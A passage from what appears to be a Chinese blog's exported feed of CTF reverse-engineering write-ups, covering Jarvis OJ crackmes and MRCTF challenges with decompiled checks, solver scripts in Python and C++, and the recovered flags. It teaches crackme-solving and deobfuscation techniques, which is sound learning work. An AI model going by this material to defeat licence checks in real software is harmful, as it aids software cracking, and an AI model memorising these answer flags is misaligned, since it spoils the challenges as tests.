class="hljs-number">108</span>]</span><br><span class="line">flag = raw_input(<span class="hljs-string">'Input your Key:'</span>).strip()</span><br><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) != <span class="hljs-number">17</span>:</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">'Wrong Key!!'</span></span><br><span class="line">    sys.exit(<span class="hljs-number">1</span>)</span><br><span class="line">flag = flag[::-<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag)):</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(flag[i]) + pwda[i] &amp; <span class="hljs-number">255</span> != lookup[(i + pwdb[i])]:</span><br><span class="line">        <span class="hljs-built_in">print</span> <span class="hljs-string">'Wrong Key!!'</span></span><br><span class="line">        sys.exit(<span class="hljs-number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-string">'Congratulations!!'</span></span><br></pre></td></tr></tbody></table></figure><p>简单写个脚本逆一下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">lookup = [</span><br><span class="line">    <span class="hljs-number">196</span>, <span class="hljs-number">153</span>, <span class="hljs-number">149</span>, <span class="hljs-number">206</span>, <span class="hljs-number">17</span>, <span class="hljs-number">221</span>, <span class="hljs-number">10</span>, <span class="hljs-number">217</span>, <span class="hljs-number">167</span>, <span class="hljs-number">18</span>, <span class="hljs-number">36</span>, <span class="hljs-number">135</span>, <span class="hljs-number">103</span>, <span class="hljs-number">61</span>, <span class="hljs-number">111</span>, <span class="hljs-number">31</span>, <span class="hljs-number">92</span>, <span class="hljs-number">152</span>, <span class="hljs-number">21</span>, <span class="hljs-number">228</span>, <span class="hljs-number">105</span>, <span class="hljs-number">191</span>, <span class="hljs-number">173</span>, <span class="hljs-number">41</span>, <span class="hljs-number">2</span>,</span><br><span class="line">    <span class="hljs-number">245</span>, <span class="hljs-number">23</span>, <span class="hljs-number">144</span>, <span class="hljs-number">1</span>, <span class="hljs-number">246</span>, <span class="hljs-number">89</span>, <span class="hljs-number">178</span>, <span class="hljs-number">182</span>, <span class="hljs-number">119</span>, <span class="hljs-number">38</span>, <span class="hljs-number">85</span>, <span class="hljs-number">48</span>, <span class="hljs-number">226</span>, <span class="hljs-number">165</span>, <span class="hljs-number">241</span>, <span class="hljs-number">166</span>, <span class="hljs-number">214</span>, <span class="hljs-number">71</span>, <span class="hljs-number">90</span>, <span class="hljs-number">151</span>, <span class="hljs-number">3</span>, <span class="hljs-number">109</span>, <span class="hljs-number">169</span>, <span class="hljs-number">150</span>, <span class="hljs-number">224</span>,</span><br><span class="line">    <span class="hljs-number">69</span>, <span class="hljs-number">156</span>, <span class="hljs-number">158</span>, <span class="hljs-number">57</span>, <span class="hljs-number">181</span>, <span class="hljs-number">29</span>, <span class="hljs-number">200</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">252</span>, <span class="hljs-number">227</span>, <span class="hljs-number">93</span>, <span class="hljs-number">65</span>, <span class="hljs-number">82</span>, <span class="hljs-number">66</span>, <span class="hljs-number">80</span>, <span class="hljs-number">170</span>, <span class="hljs-number">77</span>, <span class="hljs-number">49</span>, <span class="hljs-number">177</span>, <span class="hljs-number">81</span>, <span class="hljs-number">94</span>, <span class="hljs-number">202</span>, <span class="hljs-number">107</span>, <span class="hljs-number">25</span>, <span class="hljs-number">73</span>,</span><br><span class="line">    <span class="hljs-number">148</span>, <span class="hljs-number">98</span>, <span class="hljs-number">129</span>, <span class="hljs-number">231</span>, <span class="hljs-number">212</span>, <span class="hljs-number">14</span>, <span class="hljs-number">84</span>, <span class="hljs-number">121</span>, <span class="hljs-number">174</span>, <span class="hljs-number">171</span>, <span class="hljs-number">64</span>, <span class="hljs-number">180</span>, <span class="hljs-number">233</span>, <span class="hljs-number">74</span>, <span class="hljs-number">140</span>, <span class="hljs-number">242</span>, <span class="hljs-number">75</span>, <span class="hljs-number">104</span>, <span class="hljs-number">253</span>, <span class="hljs-number">44</span>, <span class="hljs-number">39</span>, <span class="hljs-number">87</span>, <span class="hljs-number">86</span>, <span class="hljs-number">27</span>, <span class="hljs-number">68</span>, <span class="hljs-number">22</span>,</span><br><span class="line">    <span class="hljs-number">55</span>, <span class="hljs-number">76</span>, <span class="hljs-number">35</span>, <span class="hljs-number">248</span>, <span class="hljs-number">96</span>, <span class="hljs-number">5</span>, <span class="hljs-number">56</span>, <span class="hljs-number">20</span>, <span class="hljs-number">161</span>, <span class="hljs-number">213</span>, <span class="hljs-number">238</span>, <span class="hljs-number">220</span>, <span class="hljs-number">72</span>, <span class="hljs-number">100</span>, <span class="hljs-number">247</span>, <span class="hljs-number">8</span>, <span class="hljs-number">63</span>, <span class="hljs-number">249</span>, <span class="hljs-number">145</span>, <span class="hljs-number">243</span>, <span class="hljs-number">155</span>, <span class="hljs-number">222</span>, <span class="hljs-number">122</span>, <span class="hljs-number">32</span>, <span class="hljs-number">43</span>, <span class="hljs-number">186</span>,</span><br><span class="line">    <span class="hljs-number">0</span>, <span class="hljs-number">102</span>, <span class="hljs-number">216</span>, <span class="hljs-number">126</span>, <span class="hljs-number">15</span>, <span class="hljs-number">42</span>, <span class="hljs-number">115</span>, <span class="hljs-number">138</span>, <span class="hljs-number">240</span>, <span class="hljs-number">147</span>, <span class="hljs-number">229</span>, <span class="hljs-number">204</span>, <span class="hljs-number">117</span>, <span class="hljs-number">223</span>, <span class="hljs-number">141</span>, <span class="hljs-number">159</span>, <span class="hljs-number">131</span>, <span class="hljs-number">232</span>, <span class="hljs-number">124</span>, <span class="hljs-number">254</span>, <span class="hljs-number">60</span>, <span class="hljs-number">116</span>, <span class="hljs-number">46</span>, <span class="hljs-number">113</span>,</span><br><span class="line">    <span class="hljs-number">79</span>, <span class="hljs-number">16</span>, <span class="hljs-number">128</span>, <span class="hljs-number">6</span>, <span class="hljs-number">251</span>, <span class="hljs-number">40</span>, <span class="hljs-number">205</span>, <span class="hljs-number">137</span>, <span class="hljs-number">199</span>, <span class="hljs-number">83</span>, <span class="hljs-number">54</span>, <span class="hljs-number">188</span>, <span class="hljs-number">19</span>, <span class="hljs-number">184</span>, <span class="hljs-number">201</span>, <span class="hljs-number">110</span>, <span class="hljs-number">255</span>, <span class="hljs-number">26</span>, <span class="hljs-number">91</span>, <span class="hljs-number">211</span>, <span class="hljs-number">132</span>, <span class="hljs-number">160</span>, <span class="hljs-number">168</span>, <span class="hljs-number">154</span>, <span class="hljs-number">185</span>,</span><br><span class="line">    <span class="hljs-number">183</span>, <span class="hljs-number">244</span>, <span class="hljs-number">78</span>, <span class="hljs-number">33</span>, <span class="hljs-number">123</span>, <span class="hljs-number">28</span>, <span class="hljs-number">59</span>, <span class="hljs-number">12</span>, <span class="hljs-number">210</span>, <span class="hljs-number">218</span>, <span class="hljs-number">47</span>, <span class="hljs-number">163</span>, <span class="hljs-number">215</span>, <span class="hljs-number">209</span>, <span class="hljs-number">108</span>, <span class="hljs-number">235</span>, <span class="hljs-number">237</span>, <span class="hljs-number">118</span>, <span class="hljs-number">101</span>, <span class="hljs-number">24</span>, <span class="hljs-number">234</span>, <span class="hljs-number">106</span>, <span class="hljs-number">143</span>, <span class="hljs-number">88</span>, <span class="hljs-number">9</span>,</span><br><span class="line">    <span class="hljs-number">136</span>, <span class="hljs-number">95</span>, <span class="hljs-number">30</span>, <span class="hljs-number">193</span>, <span class="hljs-number">176</span>, <span class="hljs-number">225</span>, <span class="hljs-number">198</span>, <span class="hljs-number">197</span>, <span class="hljs-number">194</span>, <span class="hljs-number">239</span>, <span class="hljs-number">134</span>, <span class="hljs-number">162</span>, <span class="hljs-number">192</span>, <span class="hljs-number">11</span>, <span class="hljs-number">70</span>, <span class="hljs-number">58</span>, <span class="hljs-number">187</span>, <span class="hljs-number">50</span>, <span class="hljs-number">67</span>, <span class="hljs-number">236</span>, <span class="hljs-number">230</span>, <span class="hljs-number">13</span>, <span class="hljs-number">99</span>, <span class="hljs-number">190</span>, <span class="hljs-number">208</span>,</span><br><span class="line">    <span class="hljs-number">207</span>, <span class="hljs-number">7</span>, <span class="hljs-number">53</span>, <span class="hljs-number">219</span>, <span class="hljs-number">203</span>, <span class="hljs-number">62</span>, <span class="hljs-number">114</span>, <span class="hljs-number">127</span>, <span class="hljs-number">125</span>, <span class="hljs-number">164</span>, <span class="hljs-number">179</span>, <span class="hljs-number">175</span>, <span class="hljs-number">112</span>, <span class="hljs-number">172</span>, <span class="hljs-number">250</span>, <span class="hljs-number">133</span>, <span class="hljs-number">130</span>, <span class="hljs-number">52</span>, <span class="hljs-number">189</span>, <span class="hljs-number">97</span>, <span class="hljs-number">146</span>, <span class="hljs-number">34</span>, <span class="hljs-number">157</span>, <span class="hljs-number">120</span>,</span><br><span class="line">    <span class="hljs-number">195</span>, <span class="hljs-number">45</span>, <span class="hljs-number">4</span>, <span class="hljs-number">142</span>, <span class="hljs-number">139</span>]</span><br><span class="line">pwda = [</span><br><span class="line">    <span class="hljs-number">188</span>, <span class="hljs-number">155</span>, <span class="hljs-number">11</span>, <span class="hljs-number">58</span>, <span class="hljs-number">251</span>, <span class="hljs-number">208</span>, <span class="hljs-number">204</span>, <span class="hljs-number">202</span>, <span class="hljs-number">150</span>, <span class="hljs-number">120</span>, <span class="hljs-number">206</span>, <span class="hljs-number">237</span>, <span class="hljs-number">114</span>, <span class="hljs-number">92</span>, <span class="hljs-number">126</span>, <span class="hljs-number">6</span>, <span class="hljs-number">42</span>]</span><br><span class="line">pwdb = [<span class="hljs-number">53</span>, <span class="hljs-number">222</span>, <span class="hljs-number">230</span>, <span class="hljs-number">35</span>, <span class="hljs-number">67</span>, <span class="hljs-number">248</span>, <span class="hljs-number">226</span>, <span class="hljs-number">216</span>, <span class="hljs-number">17</span>, <span class="hljs-number">209</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>, <span class="hljs-number">181</span>, <span class="hljs-number">200</span>, <span class="hljs-number">171</span>, <span class="hljs-number">60</span>, <span class="hljs-number">108</span>]</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):</span><br><span class="line">    index = <span class="hljs-number">16</span> - i</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>((lookup[(index + pwdb[index])] - pwda[index])&amp;<span class="hljs-number">255</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># PCTF{PyC_Cr4ck3r}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Classical-Crackme"><a href="#Classical-Crackme" class="headerlink" title="Classical Crackme"></a>Classical Crackme</h4><p>这题有<code>confuser</code>的混淆，想脱掉这个壳有点困难，所以先看看代码</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private void \u202C\u200B\u206A\u202A\u206D\u206B\u202D\u206F\u202D\u200C\u200E\u206B\u202E\u202E\u202C\u202B\u206A\u206D\u206E\u202B\u206E\u200F\u202D\u200E\u202C\u200F\u200D\u200F\u202B\u200C\u202A\u206D\u206A\u206E\u202D\u200D\u200C\u206B\u202A\u202D\u202E(object A_1, EventArgs A_2)</span><br><span class="line">{</span><br><span class="line">string s = this.\u200E\u206F\u206A\u200F\u206E\u202C\u206C\u200C\u206A\u200B\u206E\u202D\u206B\u202D\u200F\u206B\u202B\u200C\u206B\u202D\u206D\u202B\u206B\u200C\u206F\u206D\u206A\u202D\u200F\u202E\u200B\u206D\u202C\u200D\u200D\u202C\u200F\u202E\u202E\u206A\u202E.Text.ToString();</span><br><span class="line">byte[] bytes = Encoding.Default.GetBytes(s);</span><br><span class="line">string a = Convert.ToBase64String(bytes);</span><br><span class="line">string b = "UENURntFYTV5X0RvX05ldF9DcjRjazNyfQ==";</span><br><span class="line">if (a == b)</span><br><span class="line">{</span><br><span class="line">MessageBox.Show("注册成功！", "提示", MessageBoxButtons.OK);</span><br><span class="line">}</span><br><span class="line">else</span><br><span class="line">{</span><br><span class="line">MessageBox.Show("注册失败！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>找到关键部分，发现是简单对输入<code>base64</code>处理，然后直接对比，所以<code>base64</code>解码之后就可以了</p><h4 id="Classic-Crackme2"><a href="#Classic-Crackme2" class="headerlink" title="Classic Crackme2"></a>Classic Crackme2</h4><p>这题和上一个基本相似，也是<code>c#</code>+<code>confuser</code>，不过这次想直接找到关键代码有点困难，所以调试解决，在主函数下断点</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-1.png" alt="Classic_Crackme-1"></p><p>断点处这一串奇怪的字符串名应该就是关键的类，启动调试，跟进去</p><p>调试过程中发现了关键的比较</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-2.png" alt="Classic_Crackme-2"></p><p><code>text1</code>是我们的输入，去看看<code>text2</code>是什么</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-3.png" alt="Classic_Crackme-3"></p><p>发现加密方式是<code>AES-ECB</code>方式加密，填充方式也已知，<code>key</code>在局部变量窗口可以获得，最后应该还有个比较，接着调试</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-4.png" alt="Classic_Crackme-4"></p><p>发现了我们的输入被加密之后和另一串进行了一个比较，然后就可以写个脚本来跑一跑</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">cipher = <span class="hljs-string">"x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk="</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">key=<span class="hljs-string">"pctf2016pctf2016pctf2016pctf2016"</span></span><br><span class="line">cryptor = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plain_text = cryptor.decrypt(cipher)</span><br><span class="line"><span class="hljs-built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#b'PCTF{Dot_Net_UnPack3r_yoo}\x06\x06\x06\x06\x06\x06'</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Smali"><a href="#Smali" class="headerlink" title="Smali"></a>Smali</h4><p><code>Smali</code>的语法我还是不是很会，不过这题比较简单，可以很容易看出来，也是简单的AES加密</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">cipher = <span class="hljs-string">"sSNnx1UKbYrA1+MOrdtDTA=="</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">key = <span class="hljs-string">"cGhyYWNrICBjdGYgMjAxNg=="</span></span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">cryptor = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plain_text = cryptor.decrypt(cipher)</span><br><span class="line"><span class="hljs-built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#b'PCTF{Sm4liRiver}'</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> Javis OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF-wp</title>
      <link href="/2020/03/30/MRCTF-wp/"/>
      <url>/2020/03/30/MRCTF-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>最近招新事情实在是有点多，这比赛只打了半天，做了几道re和简单的pwn，随便写一下</p><span id="more"></span><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h4><p>太简单了没什么好说的，直接上代码</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"ida.h"</span></span></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> dword_40F040[<span class="hljs-number">33</span>] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">9</span>,</span><br><span class="line">                    <span class="hljs-number">10</span>,</span><br><span class="line">                    <span class="hljs-number">15</span>,</span><br><span class="line">                    <span class="hljs-number">23</span>,</span><br><span class="line">                    <span class="hljs-number">7</span>,</span><br><span class="line">                    <span class="hljs-number">24</span>,</span><br><span class="line">                    <span class="hljs-number">12</span>,</span><br><span class="line">                    <span class="hljs-number">6</span>,</span><br><span class="line">                    <span class="hljs-number">1</span>,</span><br><span class="line">                    <span class="hljs-number">16</span>,</span><br><span class="line">                    <span class="hljs-number">3</span>,</span><br><span class="line">                    <span class="hljs-number">17</span>,</span><br><span class="line">                    <span class="hljs-number">32</span>,</span><br><span class="line">                    <span class="hljs-number">29</span>,</span><br><span class="line">                    <span class="hljs-number">11</span>,</span><br><span class="line">                    <span class="hljs-number">30</span>,</span><br><span class="line">                    <span class="hljs-number">27</span>,</span><br><span class="line">                    <span class="hljs-number">22</span>,</span><br><span class="line">                    <span class="hljs-number">4</span>,</span><br><span class="line">                    <span class="hljs-number">13</span>,</span><br><span class="line">                    <span class="hljs-number">19</span>,</span><br><span class="line">                    <span class="hljs-number">20</span>,</span><br><span class="line">                    <span class="hljs-number">21</span>,</span><br><span class="line">                    <span class="hljs-number">2</span>,</span><br><span class="line">                    <span class="hljs-number">25</span>,</span><br><span class="line">                    <span class="hljs-number">5</span>,</span><br><span class="line">                    <span class="hljs-number">31</span>,</span><br><span class="line">                    <span class="hljs-number">8</span>,</span><br><span class="line">                    <span class="hljs-number">18</span>,</span><br><span class="line">                    <span class="hljs-number">26</span>,</span><br><span class="line">                    <span class="hljs-number">28</span>,</span><br><span class="line">                    <span class="hljs-number">14</span>,</span><br><span class="line">                    <span class="hljs-number">0</span></span><br><span class="line">            };</span><br><span class="line">    <span class="hljs-keyword">char</span> target[<span class="hljs-number">33</span>] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">103</span>,</span><br><span class="line">                    <span class="hljs-number">121</span>,</span><br><span class="line">                    <span class="hljs-number">123</span>,</span><br><span class="line">                    <span class="hljs-number">127</span>,</span><br><span class="line">                    <span class="hljs-number">117</span>,</span><br><span class="line">                    <span class="hljs-number">43</span>,</span><br><span class="line">                    <span class="hljs-number">60</span>,</span><br><span class="line">                    <span class="hljs-number">82</span>,</span><br><span class="line">                    <span class="hljs-number">83</span>,</span><br><span class="line">                    <span class="hljs-number">121</span>,</span><br><span class="line">                    <span class="hljs-number">87</span>,</span><br><span class="line">                    <span class="hljs-number">94</span>,</span><br><span class="line">                    <span class="hljs-number">93</span>,</span><br><span class="line">                    <span class="hljs-number">66</span>,</span><br><span class="line">                    <span class="hljs-number">123</span>,</span><br><span class="line">                    <span class="hljs-number">45</span>,</span><br><span class="line">                    <span class="hljs-number">42</span>,</span><br><span class="line">                    <span class="hljs-number">102</span>,</span><br><span class="line">                    <span class="hljs-number">66</span>,</span><br><span class="line">                    <span class="hljs-number">126</span>,</span><br><span class="line">                    <span class="hljs-number">76</span>,</span><br><span class="line">                    <span class="hljs-number">87</span>,</span><br><span class="line">                    <span class="hljs-number">121</span>,</span><br><span class="line">                    <span class="hljs-number">65</span>,</span><br><span class="line">                    <span class="hljs-number">107</span>,</span><br><span class="line">                    <span class="hljs-number">126</span>,</span><br><span class="line">                    <span class="hljs-number">101</span>,</span><br><span class="line">                    <span class="hljs-number">60</span>,</span><br><span class="line">                    <span class="hljs-number">92</span>,</span><br><span class="line">                    <span class="hljs-number">69</span>,</span><br><span class="line">                    <span class="hljs-number">111</span>,</span><br><span class="line">                    <span class="hljs-number">98</span>,</span><br><span class="line">                    <span class="hljs-number">77</span></span><br><span class="line">            };</span><br><span class="line">    <span class="hljs-keyword">char</span> tmp[<span class="hljs-number">33</span>];</span><br><span class="line">    <span class="hljs-keyword">char</span> flag[<span class="hljs-number">33</span>];</span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">32</span>;i++)</span><br><span class="line">    {</span><br><span class="line">        tmp[i]=target[i]^<span class="hljs-built_in">LOBYTE</span>(dword_40F040[i]);</span><br><span class="line">        flag[dword_40F040[i]]=tmp[i];</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h4><p>简单的<code>lua</code>，用了<code>smc</code>，但是调试可以之间看到执行的代码，复制出来即可</p><figure class="highlight lua hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cmps={{<span class="hljs-number">83</span>,<span class="hljs-number">80</span>,<span class="hljs-number">73</span>,<span class="hljs-number">80</span>,<span class="hljs-number">76</span>,<span class="hljs-number">125</span>,<span class="hljs-number">61</span>,<span class="hljs-number">96</span>,<span class="hljs-number">107</span>,<span class="hljs-number">85</span>,<span class="hljs-number">62</span>,<span class="hljs-number">63</span>,<span class="hljs-number">121</span>,<span class="hljs-number">122</span>,<span class="hljs-number">101</span>,<span class="hljs-number">33</span>,<span class="hljs-number">123</span>,<span class="hljs-number">82</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">54</span>,<span class="hljs-number">100</span>,<span class="hljs-number">101</span>,<span class="hljs-number">97</span>,<span class="hljs-number">85</span>,<span class="hljs-number">111</span>,<span class="hljs-number">39</span>,<span class="hljs-number">97</span>}}</span><br><span class="line"><span class="hljs-built_in">print</span>(\<span class="hljs-string">"Give Me Your Flag LOL!:\")</span></span><br><span class="line"><span class="hljs-string">flag=io.read()</span></span><br><span class="line"><span class="hljs-string">if string.len(flag)~=28 then</span></span><br><span class="line"><span class="hljs-string">print(\"Wrong flag!\")</span></span><br><span class="line"><span class="hljs-string">os.exit()</span></span><br><span class="line"><span class="hljs-string">end</span></span><br><span class="line"><span class="hljs-string">for i=1,string.len(flag) do</span></span><br><span class="line"><span class="hljs-string">local x=string.byte(flag,i)</span></span><br><span class="line"><span class="hljs-string">if i%2==0 then</span></span><br><span class="line"><span class="hljs-string">x=x~i</span></span><br><span class="line"><span class="hljs-string">else</span></span><br><span class="line"><span class="hljs-string">x=x+6</span></span><br><span class="line"><span class="hljs-string">end</span></span><br><span class="line"><span class="hljs-string">if x~=cmps[i] then</span></span><br><span class="line"><span class="hljs-string">print(\"Wrong flag!\")</span></span><br><span class="line"><span class="hljs-string">os.exit()</span></span><br><span class="line"><span class="hljs-string">end</span></span><br><span class="line"><span class="hljs-string">end</span></span><br><span class="line"><span class="hljs-string">print(\"Right flag!\")</span></span><br><span class="line"><span class="hljs-string">os.exit()</span></span><br></pre></td></tr></tbody></table></figure><p>判断的逻辑也很简单，分奇偶进行不同的操作，用python跑一遍就可以出来flag</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmps = [<span class="hljs-number">83</span>, <span class="hljs-number">80</span>, <span class="hljs-number">73</span>, <span class="hljs-number">80</span>, <span class="hljs-number">76</span>, <span class="hljs-number">125</span>, <span class="hljs-number">61</span>, <span class="hljs-number">96</span>, <span class="hljs-number">107</span>, <span class="hljs-number">85</span>, <span class="hljs-number">62</span>, <span class="hljs-number">63</span>, <span class="hljs-number">121</span>, <span class="hljs-number">122</span>, <span class="hljs-number">101</span>, <span class="hljs-number">33</span>, <span class="hljs-number">123</span>, <span class="hljs-number">82</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">54</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">85</span>,</span><br><span class="line">        <span class="hljs-number">111</span>, <span class="hljs-number">39</span>, <span class="hljs-number">97</span>]</span><br><span class="line">flag=<span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):</span><br><span class="line">    x = cmps[i]</span><br><span class="line">    <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span>) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:</span><br><span class="line">        x ^= (i + <span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        x -= <span class="hljs-number">6</span></span><br><span class="line">    flag+=<span 